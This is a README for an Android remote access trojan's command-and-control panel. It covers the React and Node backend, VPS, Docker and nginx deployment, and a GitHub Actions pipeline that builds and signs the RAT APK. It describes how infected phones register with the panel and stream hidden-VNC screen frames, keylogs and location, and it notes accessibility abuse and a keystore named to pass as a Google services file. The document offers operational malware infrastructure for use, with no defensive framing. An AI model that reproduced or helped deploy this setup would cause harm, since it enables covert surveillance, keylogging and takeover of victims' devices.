# Remote Panel

Full-stack C2 control panel. React + TypeScript frontend, Node.js WebSocket backend, GitHub Actions APK build pipeline.

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                        VPS / Local                        │
│                                                           │
│  ┌──────────────────┐     ┌───────────────────────────┐  │
│  │   Frontend       │     │   Backend (Node.js)        │  │
│  │  React + Vite    │────▶│                           │  │
│  │  Served at :3001 │     │  Express REST   :3001      │  │
│  └──────────────────┘     │  WS Operator    :3001/ws  │  │
│                            │  WS Devices     :3002      │  │
│                            └────────────┬──────────────┘  │
└─────────────────────────────────────────│─────────────────┘
                                          │  WebSocket
                             ┌────────────▼──────────────┐
                             │   Android Device (RAT)     │
                             │   CommandControlService    │
                             │   UiAssistBridge (A11Y)   │
                             └───────────────────────────┘
```

### Ports

| Port | Purpose |
|------|---------|
| `3001` | Operator HTTP + WebSocket (auth-gated) |
| `3002` | Device WebSocket (RAT APK connects here) |

---

## Quick Start — Local

### 1. Clone & configure

```bash
cp .env.example .env
# Edit .env — set PANEL_PASSWORD, JWT_SECRET, DEVICE_PORT
```

### 2. Backend

```bash
cd backend
npm install
npm run dev
```

### 3. Frontend

```bash
cd frontend
npm install
npm run dev
# Opens at http://localhost:5173
```

### 4. Production build (frontend served by backend)

```bash
cd frontend && npm run build   # outputs to ../backend/public
cd ../backend && npm run build
npm start
```

---

## Docker (local or VPS)

```bash
# Copy and edit env
cp .env.example .env

# Build + run
docker compose up --build -d

# Logs
docker compose logs -f

# Stop
docker compose down
```

---

## VPS Deployment (no Docker)

```bash
# Install Node 20+
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Clone and build
git clone <repo> /opt/rat-panel && cd /opt/rat-panel
cp .env.example .env  # edit first
cd frontend && npm ci && npm run build
cd ../backend && npm ci && npm run build

# Run with PM2
npm install -g pm2
cd /opt/rat-panel/backend
pm2 start dist/server.js --name rat-panel
pm2 save && pm2 startup
```

### Nginx reverse proxy (optional, for port 80/443)

```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

---

## GitHub Actions — APK Build

### Secrets to add (`Settings → Secrets → Actions`)

| Secret | Description |
|--------|-------------|
| `KEYSTORE_BASE64` | `base64 -w0 google-services-release.jks` |
| `KEYSTORE_ALIAS` | Keystore alias (e.g. `key0`) |
| `KEYSTORE_PASSWORD` | Keystore password |
| `VPS_HOST` | VPS IP (for deploy workflow) |
| `VPS_USER` | SSH username |
| `VPS_SSH_KEY` | Private SSH key |

### Trigger a build

`Actions → Build APK → Run workflow` — fill in C2 host/port.

Signed APK is uploaded as a workflow artifact.

---

## APK Connection — updating the RAT

The APK's `CommandControlService` connects via WebSocket. Point it at your backend's device port:

```
ws://YOUR_VPS_IP:3002
```

The APK sends JSON on connect:
```json
{
  "type": "register",
  "deviceId": "...",
  "model": "...",
  "brand": "...",
  "hasAccessibility": true,
  ...
}
```

Then sends binary JPEG frames for HVNC, and JSON events for keylog, location, etc.

---

## Panel Login

Default password: set in `.env` → `PANEL_PASSWORD`.  
Default for dev: `admin`.  

**Change before any deployment.**

---

## TLS

Place `key.pem` and `cert.pem` in `./backend/certs/`, then set `USE_TLS=true` in `.env`.  
For Let's Encrypt: `certbot certonly --standalone -d your-domain.com`

---

## File Structure

```
rat-panel/
├── .github/workflows/
│   ├── build-apk.yml        ← APK CI build + signing
│   └── deploy.yml           ← Panel deploy to VPS / Render
├── frontend/                ← React + Vite + Tailwind
│   └── src/
│       ├── components/      ← DeviceScreen, ControlPanel, APKBuilder...
│       ├── pages/           ← Login, Dashboard, DeviceControl
│       ├── services/        ← api.ts, wsService.ts
│       ├── store/           ← Zustand global state
│       └── types/           ← TypeScript definitions
├── backend/                 ← Express + ws
│   └── src/
│       ├── server.ts        ← Entry point
│       ├── wsManager.ts     ← Device/operator WS relay
│       ├── apkBuilder.ts    ← Gradle + uber-apk-signer pipeline
│       └── routes/          ← auth, devices, apk
├── android-rat/             ← Original Android project
├── docker-compose.yml
├── Dockerfile
└── .env.example
```
